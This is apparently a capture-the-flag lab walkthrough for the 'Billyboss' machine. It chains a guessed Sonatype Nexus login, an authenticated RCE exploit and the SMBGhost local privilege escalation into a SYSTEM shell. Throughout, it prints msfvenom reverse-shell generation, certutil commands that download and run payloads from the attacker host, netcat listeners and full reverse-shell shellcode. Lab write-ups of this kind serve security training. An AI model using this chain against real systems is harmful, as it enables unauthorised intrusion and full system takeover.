
# Exploitation Guide for Billyboss

## Summary

We'll gain a foothold on this machine with some basic password guessing. We'll then exploit a remote code execution vulnerability in the Sonatype Nexus application installed on this machine. Finally, we'll exploit the SMBGhost vulnerability to escalate our privileges.

## Enumeration

### Nmap

We'll start off with a simple Nmap scan.

```
kali@kali:~$ sudo nmap 192.168.140.61
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 01:33 EST
Nmap scan report for 192.168.140.61
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

### Sonatype Nexus

Browsing to the website on port 8081, we find an installation of Sonatype Nexus. A quick online search reveals that there are no default credentials we can exploit. However, after a few educated guesses, we log in as `nexus:nexus`.

According to the information in the top-left corner, the target is running Sonatype Nexus version 3.21.0-05.

## Exploitation

### Sonatype Nexus Authenticated Code Execution

An EDB search reveals that version 3.21.0-05 of Sonatype Nexus is vulnerable to a [remote code execution exploit](https://www.exploit-db.com/exploits/49385). To run the exploit, we'll first generate an MSFVenom reverse shell payload.

```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8081
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

We'll host our payload over HTTP.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's start a Netcat handler on port 8081 to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We'll modify the exploit as follows:

```
URL='http://192.168.140.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

Next, we'll run the exploit to download our payload.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

We'll make a few more modifications, this time executing our payload.

```
CMD='cmd.exe /c shell.exe'
```

Let's run the exploit again.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

Finally, we catch our reverse shell as `nathan`.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.140.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.140.61] 49883
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan
```

## Escalation

### Installed Patches Enumeration

Listing the installed KBs, we learn that the most recently installed patch is `KB4540673`. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list
wmic qfe list
Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=4552931  BILLYBOSS  Update                        KB4552931               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497165  BILLYBOSS  Update                        KB4497165               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497727  BILLYBOSS  Security Update               KB4497727                                    4/1/2019 
http://support.microsoft.com/?kbid=4537759  BILLYBOSS  Security Update               KB4537759               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update               KB4552152               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update                        KB4540673               BILLYBOSS\nathan     5/27/2020
```

### SMB Settings Enumeration

To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.

```

C:\Users\nathan\Nexus\nexus-3.21.0-05>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1788
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       808
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:8081           0.0.0.0:0              LISTENING       2076
...
```

### SMBGhost Exploitation

We'll use [this exploit](https://github.com/danigargu/CVE-2020-0796) against the SMB service. Starting with line 204 in **exploit.cpp**, we'll replace the shellcode with a reverse shell.

```
// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
    0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
    0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x91,0xc0,0xa8,0x31,0xb1,0x41,0x54,
    0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
    0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
    0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
    0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
    0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
    0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
    0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
    0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
    0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
    0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
    0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
    0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
    0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};
```

Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to `x64` and `Release` and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe
certutil -urlcache -split -f http://KALI/cve-2020-0796-local.exe cve-2020-0796-local.exe
****  Online  ****
  000000  ...
  01e600
CertUtil: -URLCache command completed successfully.
```

Let's start a Netcat handler to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We can now trigger the exploit.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>cve-2020-0796-local.exe
cve-2020-0796-local.exe
-= CVE-2020-0796 LPE =-
by @danigargu and @dialluvioso_

Successfully connected socket descriptor: 216
Sending SMB negotiation request...
Finished SMB negotiation
Found kernel token at 0xffffab002ca2c060
Sending compressed buffer...
SEP_TOKEN_PRIVILEGES changed
Injecting shellcode in winlogon...
Success! ;)
```

Our listener indicates we have obtained a SYSTEM shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.177.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.177.61] 49687
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```****
